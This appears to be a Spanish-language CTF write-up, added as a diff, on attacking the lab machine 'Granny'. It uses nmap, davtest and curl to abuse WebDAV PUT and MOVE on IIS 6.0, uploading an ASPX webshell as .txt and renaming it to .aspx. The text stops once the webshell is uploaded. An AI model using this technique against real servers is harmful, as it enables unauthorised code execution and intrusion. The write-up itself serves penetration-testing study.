@@ -1,0 +1,93 @@
+# Veremos como obtener una reverse shell en un IIS 6.0 con webdav, el cual como nos reporta nmap estan todos los tipos de Request Method
+# Maquina practicada Granny
+
+[*] Con el nmap veremos que tenemos todo tipo de Web Request
+   
+   [+] Output Nmap:
+         PORT   STATE SERVICE VERSION
+         80/tcp open  http    Microsoft IIS httpd 6.0
+         | http-webdav-scan: 
+         |   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+         -
+
+[*] Para aprovecharnos de estos requests methods tendremos que hacerlo con curl de la siguiente forma  
+
+[*] Primero deberemos de intentar subir un fichero con el metodo PUT
+   
+   [+] Command -> echo 'test' > test.txt
+   [+] Command -> curl -s -X PUT http://10.10.10.15/example.txt -d@test.txt
+      
+      [+] Output http://10.10.10.15/example.txt
+         
+         test
+
+[*] Hemos visto que si que podemos subir un archivo, para comprobar si pudiesemos subir archivos asp, tendremos que comprobarlo con una herramienta llamada davtest
+   
+   [+] Command -> davtest -url http://10.10.10.15
+
+      [+] Output:
+            ********************************************************
+            Testing DAV connection
+            OPEN		SUCCEED:		http://10.10.10.15
+            ********************************************************
+            NOTE	Random string for this session: vbytdoSjv
+            ********************************************************
+            Creating directory
+            MKCOL		SUCCEED:		Created http://10.10.10.15/DavTestDir_vbytdoSjv
+            ********************************************************
+             Sending test files
+            PUT	jsp	SUCCEED:	http://10.10.10.15/DavTestDir_vbytdoSjv/davtest_vbytdoSjv.jsp
+            PUT	cgi	FAIL
+            PUT	cfm	SUCCEED:	http://10.10.10.15/DavTestDir_vbytdoSjv/davtest_vbytdoSjv.cfm
+            PUT	txt	SUCCEED:	http://10.10.10.15/DavTestDir_vbytdoSjv/davtest_vbytdoSjv.txt
+            PUT	jhtml	SUCCEED:	http://10.10.10.15/DavTestDir_vbytdoSjv/davtest_vbytdoSjv.jhtml
+            PUT	aspx	FAIL
+            PUT	asp	FAIL
+            PUT	html	SUCCEED:	http://10.10.10.15/DavTestDir_vbytdoSjv/davtest_vbytdoSjv.html
+            PUT	php	SUCCEED:	http://10.10.10.15/DavTestDir_vbytdoSjv/davtest_vbytdoSjv.php
+            PUT	pl      SUCCEED:	http://10.10.10.15/DavTestDir_vbytdoSjv/davtest_vbytdoSjv.pl
+            PUT	shtml	FAIL
+            ********************************************************
+             Checking for test file execution
+            EXEC	jsp	FAIL
+            EXEC	cfm	FAIL
+            EXEC	txt	SUCCEED:	http://10.10.10.15/DavTestDir_vbytdoSjv/davtest_vbytdoSjv.txt
+            EXEC	jhtml	FAIL
+            EXEC	html   	SUCCEED:	http://10.10.10.15/DavTestDir_vbytdoSjv/davtest_vbytdoSjv.html
+            EXEC	php	FAIL
+            EXEC	pl	FAIL
+
+            ********************************************************
+            /usr/bin/davtest Summary:
+            Created: http://10.10.10.15/DavTestDir_vbytdoSjv
+            PUT File: http://10.10.10.15/DavTestDir_vbytdoSjv/davtest_vbytdoSjv.jsp
+            PUT File: http://10.10.10.15/DavTestDir_vbytdoSjv/davtest_vbytdoSjv.cfm
+            PUT File: http://10.10.10.15/DavTestDir_vbytdoSjv/davtest_vbytdoSjv.txt
+            PUT File: http://10.10.10.15/DavTestDir_vbytdoSjv/davtest_vbytdoSjv.jhtml
+            PUT File: http://10.10.10.15/DavTestDir_vbytdoSjv/davtest_vbytdoSjv.html
+            PUT File: http://10.10.10.15/DavTestDir_vbytdoSjv/davtest_vbytdoSjv.php
+            PUT File: http://10.10.10.15/DavTestDir_vbytdoSjv/davtest_vbytdoSjv.pl
+            Executes: http://10.10.10.15/DavTestDir_vbytdoSjv/davtest_vbytdoSjv.txt
+            Executes: http://10.10.10.15/DavTestDir_vbytdoSjv/davtest_vbytdoSjv.html
+
+[*] En el reporte vemos como con ciertas extensiones como .txt si funciona, pero vemos que con .asp no funciona, por lo cual que se podria hacer?
+
+[*] Si volvemos al output del nmap, veremos que unos de los metodos que podemos tocar es el de MOVE, por lo cual podremos aprovecharnos de este metodo para hacer el lio de montepio
+
+[*] Necesitaremos una webshell de asp, por lo cual si estas en parrot podremos hacer un locate de cmdasp.aspx
+      
+   [+] Output:
+      /home/batman/htb/RE/content/webshell/fuzzdb-webshell/asp/cmdasp.aspx
+      /usr/share/webshells/aspx/cmdasp.aspx
+
+[*] Nos copiaremos el de abajo, nos lo traeremos a la carpeta de trabajo.
+
+[*] Tenemos que renombrar el cmdasp.aspx a cmdasp.txt y lo subiremos a la web
+      
+   [+] Command -> curl -s -X PUT http://10.10.10.15/cmdasp.txt -d @cmdasp.aspx
+
+[*] Ahora aprovechandonos de que tenemos el metodo MOVE a nuestra disposicion, haremos renombrar cdmasp.txt as cmdasp.aspx
+   
+   [+] Command -> curl -s -X MOVE -H "Destination:http://10.10.10.15/cmdasp.aspx" http://10.10.10.15/cmdasp.txt
+
+[*] Y ya tendriamos terminado la subida de la webshell
